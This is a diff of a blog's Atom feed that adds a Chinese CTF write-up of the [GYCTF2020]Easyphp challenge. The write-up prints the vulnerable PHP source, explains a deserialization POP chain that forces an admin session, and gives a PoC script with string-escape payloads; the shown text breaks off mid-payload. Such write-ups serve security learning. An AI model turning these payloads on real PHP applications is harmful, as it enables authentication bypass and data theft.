@@ -57,6 +57,9 @@
     <category term="xss攻击" />
     <category term="c的预处理" />
     <category term="图片类" />
+    <category term="爬虫" />
+    <category term="js原型链污染" />
+    <category term="反序列化字符串逃逸" />
     <entry>
         <id>http://odiws.github.io/2024/08/27/EIS2019-EzPOP/</id>
         <title>[EIS2019]EzPOP</title>
@@ -177,6 +180,321 @@
         <category term="buuctf" />
         <category term="php反序列化" />
         <updated>2024-08-13T15:10:31.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://odiws.github.io/2024/08/06/GYCTF2020-Easyphp/</id>
+        <title>[GYCTF2020]Easyphp</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/08/06/GYCTF2020-Easyphp/"/>
+        <content type="html">&lt;h2 id=&#34;gyctf2020easyphp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gyctf2020easyphp&#34;&gt;#&lt;/a&gt; [GYCTF2020]Easyphp&lt;/h2&gt;
+&lt;h3 id=&#34;前言&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h3&gt;
+&lt;h4 id=&#34;知识点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#知识点&#34;&gt;#&lt;/a&gt; 知识点：&lt;/h4&gt;
+&lt;h5 id=&#34;wwwzip源码泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wwwzip源码泄露&#34;&gt;#&lt;/a&gt; www.zip 源码泄露&lt;/h5&gt;
+&lt;h5 id=&#34;php反序列化链poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php反序列化链poc&#34;&gt;#&lt;/a&gt; PHP 反序列化链 POC&lt;/h5&gt;
+&lt;h5 id=&#34;代码审计&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码审计&#34;&gt;#&lt;/a&gt; 代码审计&lt;/h5&gt;
+&lt;h3 id=&#34;wp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wp&#34;&gt;#&lt;/a&gt; WP:&lt;/h3&gt;
+&lt;p&gt;进入环境，题目是 easyphp 我就感觉要审源码。。。试了一下常见的泄露，发现存在 www.zip。把代码下载下来进行一下审计，发现 update.php 和 lib.php 可以利用：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+session_start();
+function safe($parm)&amp;#123;
+    $array= array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&amp;quot;&#39;&amp;quot;,&#39;\\&#39;,&amp;quot;*&amp;quot;,&amp;quot;alter&amp;quot;);
+    return str_replace($array,&#39;hacker&#39;,$parm);
+&amp;#125;
+class User
+&amp;#123;
+    public $id;
+    public $age=null;
+    public $nickname=null;
+    public function login() &amp;#123;
+        if(isset($_POST[&#39;username&#39;])&amp;amp;&amp;amp;isset($_POST[&#39;password&#39;]))&amp;#123;
+            echo &amp;quot;ok&amp;quot;;
+            $mysqli=new dbCtrl();
+            $this-&amp;gt;id=$mysqli-&amp;gt;login(&#39;select id,password from user where username=?&#39;);
+            if($this-&amp;gt;id)&amp;#123;
+            $_SESSION[&#39;id&#39;]=$this-&amp;gt;id;
+            $_SESSION[&#39;login&#39;]=1;
+            echo &amp;quot;你的ID是&amp;quot;.$_SESSION[&#39;id&#39;];
+            echo &amp;quot;你好！&amp;quot;.$_SESSION[&#39;token&#39;];
+            echo &amp;quot;&amp;lt;script&amp;gt;window.location.href=&#39;./update.php&#39;&amp;lt;/script&amp;gt;&amp;quot;;
+            return $this-&amp;gt;id;
+        &amp;#125;
+    &amp;#125;
+&amp;#125;
+    public function update()&amp;#123;
+        $Info=unserialize($this-&amp;gt;getNewinfo());
+        //print_r($Info);
+        $age=$Info-&amp;gt;age;
+        $nickname=$Info-&amp;gt;nickname;
+        $updateAction=new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&amp;quot;update user SET age=$age,nickname=$nickname where id=&amp;quot;.$_SESSION[&#39;id&#39;]);
+        //这个功能还没有写完 先占坑
+    &amp;#125;
+    public function getNewInfo()&amp;#123;
+        $age=$_POST[&#39;age&#39;];
+        $nickname=$_POST[&#39;nickname&#39;];
+        return safe(serialize(new Info($age,$nickname)));
+    &amp;#125;
+    public function __destruct()&amp;#123;
+        return file_get_contents($this-&amp;gt;nickname);//危
+    &amp;#125;
+    public function __toString()
+    &amp;#123;
+        $this-&amp;gt;nickname-&amp;gt;update($this-&amp;gt;age);
+        return &amp;quot;0-0&amp;quot;;
+    &amp;#125;
+&amp;#125;
+class Info&amp;#123;
+    public $age;
+    public $nickname;
+    public $CtrlCase;
+    public function __construct($age,$nickname)&amp;#123;
+        $this-&amp;gt;age=$age;
+        $this-&amp;gt;nickname=$nickname;
+    &amp;#125;
+    public function __call($name,$argument)&amp;#123;
+        echo $this-&amp;gt;CtrlCase-&amp;gt;login($argument[0]);
+    &amp;#125;
+&amp;#125;
+Class UpdateHelper&amp;#123;
+    public $id;
+    public $newinfo;
+    public $sql;
+    public function __construct($newInfo,$sql)&amp;#123;
+        $newInfo=unserialize($newInfo);
+        $upDate=new dbCtrl();
+    &amp;#125;
+    public function __destruct()
+    &amp;#123;
+        //var_dump($this-&amp;gt;sql);
+        echo $this-&amp;gt;sql;
+    &amp;#125;
+&amp;#125;
+class dbCtrl
+&amp;#123;
+    public $hostname=&amp;quot;127.0.0.1&amp;quot;;
+    public $dbuser=&amp;quot;root&amp;quot;;
+    public $dbpass=&amp;quot;root&amp;quot;;
+    public $database=&amp;quot;test&amp;quot;;
+    public $name;
+    public $password;
+    public $mysqli;
+    public $token;
+    public function __construct()
+    &amp;#123;
+        $this-&amp;gt;name=$_POST[&#39;username&#39;];
+        $this-&amp;gt;password=$_POST[&#39;password&#39;];
+        $this-&amp;gt;token=$_SESSION[&#39;token&#39;];
+    &amp;#125;
+    public function login($sql)
+    &amp;#123;
+        $this-&amp;gt;mysqli=new mysqli($this-&amp;gt;hostname, $this-&amp;gt;dbuser, $this-&amp;gt;dbpass, $this-&amp;gt;database);
+        if ($this-&amp;gt;mysqli-&amp;gt;connect_error) &amp;#123;
+            die(&amp;quot;连接失败，错误:&amp;quot; . $this-&amp;gt;mysqli-&amp;gt;connect_error);
+        &amp;#125;
+        $result=$this-&amp;gt;mysqli-&amp;gt;prepare($sql);
+        $result-&amp;gt;bind_param(&#39;s&#39;, $this-&amp;gt;name);
+        $result-&amp;gt;execute();
+        $result-&amp;gt;bind_result($idResult, $passwordResult);
+        $result-&amp;gt;fetch();
+        $result-&amp;gt;close();
+        if ($this-&amp;gt;token==&#39;admin&#39;) &amp;#123;
+            return $idResult;
+        &amp;#125;
+        if (!$idResult) &amp;#123;
+            echo(&#39;用户不存在!&#39;);
+            return false;
+        &amp;#125;
+        if (md5($this-&amp;gt;password)!==$passwordResult) &amp;#123;
+            echo(&#39;密码错误！&#39;);
+            return false;
+        &amp;#125;
+        $_SESSION[&#39;token&#39;]=$this-&amp;gt;name;
+        return $idResult;
+    &amp;#125;
+    public function update($sql)
+    &amp;#123;
+        //还没来得及写
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;update.php
+&amp;lt;?php
+require_once(&#39;lib.php&#39;);
+echo &#39;&amp;lt;html&amp;gt;
+
+&amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
+&amp;lt;title&amp;gt;update&amp;lt;/title&amp;gt;
+&amp;lt;h2&amp;gt;这是一个未完成的页面，上线时建议删除本页面&amp;lt;/h2&amp;gt;
+&amp;lt;/html&amp;gt;&#39;;
+if ($_SESSION[&#39;login&#39;]!=1)&amp;#123;
+	echo &amp;quot;你还没有登陆呢！&amp;quot;;
+&amp;#125;
+$users=new User();
+$users-&amp;gt;update();
+if($_SESSION[&#39;login&#39;]===1)&amp;#123;
+	require_once(&amp;quot;flag.php&amp;quot;);
+	echo $flag;
+&amp;#125;
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;update.php 那里只是输出你没登录，接下来的代码还会执行。update () 方法中会进行反序列化。&lt;/p&gt;
+&lt;p&gt;update.php 那里只是输出你没登录，接下来的代码还会执行。update () 方法中会进行反序列化。&lt;/p&gt;
+&lt;p&gt;简单的理一下 POC 的思路。本以为是利用 User 类的__construct 方法来读 flag.php，但是发现 safe () 过滤了 flag 和 \，因此会被过滤，无法读取。&lt;br&gt;
+但是 UpdateHelper 类中也有一个__destruct () 方法，会 echo。&lt;/p&gt;
+&lt;p&gt;正好 User 类存在__toString () 方法：&lt;/p&gt;
+&lt;p&gt;再利用 $this-&amp;gt;nickname-&amp;gt;update () 去触发 Info 类的__call ()：&lt;/p&gt;
+&lt;p&gt;这样就可以调用一个 login 方法。但是怎么得 flag？&lt;br&gt;
+lib.php 中有 2 个 login 方法，User 类得 login 方法可以让 $_SESSION [‘login’]=1，但是必须返回了 id：&lt;/p&gt;
+&lt;p&gt;跟进一下第 16 行得 login 方法，看一下逻辑：&lt;/p&gt;
+&lt;p&gt;想要正常返回&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mtext&gt;，要么&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;idResult，要么&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;要&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;么&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; this-&amp;gt;token==‘admin’，要么就是查对了用户名和密码才可以。&lt;/p&gt;
+&lt;p&gt;这时候便很自然得可以想到思路了，因为反序列化得时候除了 User 类中 login 的这里不可控，其他基本都是可控的。：&lt;/p&gt;
+&lt;p&gt;也就是说，要分 2 次。第一次反序列化最终调用的是 dbCtrl 类的 login，因为这里的 sql 语句和 dbCtrl 都可控，因此可以成功的&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;I&lt;/mi&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_SESSION[&amp;#x27;token&amp;#x27;]=&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.001892em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07847em;&#34;&gt;I&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;this-&amp;gt;name;。控一下 name，让它是 admin。&lt;/p&gt;
+&lt;p&gt;（更正，其实并不需要第二次反序列化，直接第一次反序列化设了 session 后，直接随便登录一下，用户名是 admin 即可，就可以触发 user 类的 login 方法了，不需要这里再反序列化构造来触发 User 类的 login 方法，我实际上也是思路太局限了。）&lt;/p&gt;
+&lt;p&gt;第二次反序列化最终调用 User 类的 login 方法。因为这里：&lt;/p&gt;
+&lt;p&gt;所以这时候 $this-&amp;gt;token=‘admin’，即这里满足，可以成功查到 id：&lt;/p&gt;
+&lt;p&gt;这样可以 $_SESSION [‘login’]=1;&lt;/p&gt;
+&lt;p&gt;得到 flag：&lt;/p&gt;
+&lt;p&gt;接下来就要想办法构造 POC 了，先是第一次反序列化：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+class Info&amp;#123;
+    public $age;
+    public $nickname;
+    public $CtrlCase;
+    public function __construct()
+    &amp;#123;
+        $this-&amp;gt;age = &amp;quot;1&amp;quot;;
+        $this-&amp;gt;nickname = &amp;quot;2&amp;quot;;
+        $this-&amp;gt;CtrlCase=new dbCtrl();
+        //$this-&amp;gt;CtrlCase=new User();
+    &amp;#125;
+&amp;#125;
+class User
+&amp;#123;
+    public $id=&amp;quot;1&amp;quot;;
+    public $age;
+    public $nickname;
+    public function __construct()
+    &amp;#123;
+        $this-&amp;gt;age=&#39;select &amp;quot;1&amp;quot;,&amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot; from user where username=?&#39;;
+        $this-&amp;gt;nickname=new Info();
+        //$this-&amp;gt;nickname-&amp;gt;CtrlCase=new User();
+    &amp;#125;
+&amp;#125;
+Class UpdateHelper&amp;#123;
+    public $sql;
+&amp;#125;
+
+class dbCtrl
+&amp;#123;
+    public $hostname=&amp;quot;127.0.0.1&amp;quot;;
+    public $dbuser=&amp;quot;root&amp;quot;;
+    public $dbpass=&amp;quot;root&amp;quot;;
+    public $database=&amp;quot;test&amp;quot;;
+    public $name=&amp;quot;admin&amp;quot;;
+    public $password=&amp;quot;1&amp;quot;;
+    public $mysqli;
+    public $token;
+    public $feng;
+    public function __construct()
+    &amp;#123;
+        $this-&amp;gt;feng=new UpdateHelper();
+        //$this-&amp;gt;token=&amp;quot;admin&amp;quot;;
+    &amp;#125;
+&amp;#125;
+$a=new Info();
+//$a-&amp;gt;CtrlCase=new dbCtrl();
+$a-&amp;gt;CtrlCase-&amp;gt;feng-&amp;gt;sql=new User();
+//$a-&amp;gt;CtrlCase-&amp;gt;feng-&amp;gt;sql-&amp;gt;nickname-&amp;gt;CtrlCase=new User();
+//var_dump($a-&amp;gt;CtrlCase-&amp;gt;feng-&amp;gt;sql-&amp;gt;nickname);
+//var_dump($a);
+echo serialize($a);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;需要注意之所以 new UpdateHelper () 没有写在 Info 类中，而是写在 $this-&amp;gt;CtrlCase 中，是因为这里：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;public function update()&amp;#123;
+    $Info=unserialize($this-&amp;gt;getNewinfo());
+    //print_r($Info);
+    $age=$Info-&amp;gt;age;
+    $nickname=$Info-&amp;gt;nickname;
+    $updateAction=new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&amp;quot;update user SET age=$age,nickname=$nickname where id=&amp;quot;.$_SESSION[&#39;id&#39;]);
+    //这个功能还没有写完 先占坑
+&amp;#125;
+如果$this-&amp;gt;age或者$this-&amp;gt;nickname设成UpdateHelper的话，会因为把类对象当成字符产而报错。
+产生的payload是这样：
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;O:4:&amp;quot;Info&amp;quot;:3:&amp;#123;s:3:&amp;quot;age&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;O:6:&amp;quot;dbCtrl&amp;quot;:9:&amp;#123;s:8:&amp;quot;hostname&amp;quot;;s:9:&amp;quot;127.0.0.1&amp;quot;;s:6:&amp;quot;dbuser&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:6:&amp;quot;dbpass&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:8:&amp;quot;database&amp;quot;;s:4:&amp;quot;test&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:6:&amp;quot;mysqli&amp;quot;;N;s:5:&amp;quot;token&amp;quot;;N;s:4:&amp;quot;feng&amp;quot;;O:12:&amp;quot;UpdateHelper&amp;quot;:1:&amp;#123;s:3:&amp;quot;sql&amp;quot;;O:4:&amp;quot;User&amp;quot;:3:&amp;#123;s:2:&amp;quot;id&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:3:&amp;quot;age&amp;quot;;s:72:&amp;quot;select &amp;quot;1&amp;quot;,&amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot; from user where username=?&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;O:4:&amp;quot;Info&amp;quot;:3:&amp;#123;s:3:&amp;quot;age&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;O:6:&amp;quot;dbCtrl&amp;quot;:9:&amp;#123;s:8:&amp;quot;hostname&amp;quot;;s:9:&amp;quot;127.0.0.1&amp;quot;;s:6:&amp;quot;dbuser&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:6:&amp;quot;dbpass&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:8:&amp;quot;database&amp;quot;;s:4:&amp;quot;test&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:6:&amp;quot;mysqli&amp;quot;;N;s:5:&amp;quot;token&amp;quot;;N;s:4:&amp;quot;feng&amp;quot;;O:12:&amp;quot;UpdateHelper&amp;quot;:1:&amp;#123;s:3:&amp;quot;sql&amp;quot;;N;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;通过反序列化字符逃逸，得到这样：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;O:4:&amp;quot;Info&amp;quot;:3:&amp;#123;s:3:&amp;quot;age&amp;quot;;s:901:&amp;quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;O:6:&amp;quot;dbCtrl&amp;quot;:9:&amp;#123;s:8:&amp;quot;hostname&amp;quot;;s:9:&amp;quot;127.0.0.1&amp;quot;;s:6:&amp;quot;dbuser&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:6:&amp;quot;dbpass&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:8:&amp;quot;database&amp;quot;;s:4:&amp;quot;test&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:6:&amp;quot;mysqli&amp;quot;;N;s:5:&amp;quot;token&amp;quot;;N;s:4:&amp;quot;feng&amp;quot;;O:12:&amp;quot;UpdateHelper&amp;quot;:1:&amp;#123;s:3:&amp;quot;sql&amp;quot;;O:4:&amp;quot;User&amp;quot;:3:&amp;#123;s:2:&amp;quot;id&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:3:&amp;quot;age&amp;quot;;s:72:&amp;quot;select &amp;quot;1&amp;quot;,&amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot; from user where username=?&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;O:4:&amp;quot;Info&amp;quot;:3:&amp;#123;s:3:&amp;quot;age&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;O:6:&amp;quot;dbCtrl&amp;quot;:9:&amp;#123;s:8:&amp;quot;hostname&amp;quot;;s:9:&amp;quot;127.0.0.1&amp;quot;;s:6:&amp;quot;dbuser&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:6:&amp;quot;dbpass&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:8:&amp;quot;database&amp;quot;;s:4:&amp;quot;test&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:6:&amp;quot;mysqli&amp;quot;;N;s:5:&amp;quot;token&amp;quot;;N;s:4:&amp;quot;feng&amp;quot;;O:12:&amp;quot;UpdateHelper&amp;quot;:1:&amp;#123;s:3:&amp;quot;sql&amp;quot;;N;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;N;s:8:&amp;quot;CtrlCase&amp;quot;;N;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;post 传参：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;age=&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;unionunionunionload1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;O:6:&amp;quot;dbCtrl&amp;quot;:9:&amp;#123;s:8:&amp;quot;hostname&amp;quot;;s:9:&amp;quot;127.0.0.1&amp;quot;;s:6:&amp;quot;dbuser&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:6:&amp;quot;dbpass&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:8:&amp;quot;database&amp;quot;;s:4:&amp;quot;test&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:6:&amp;quot;mysqli&a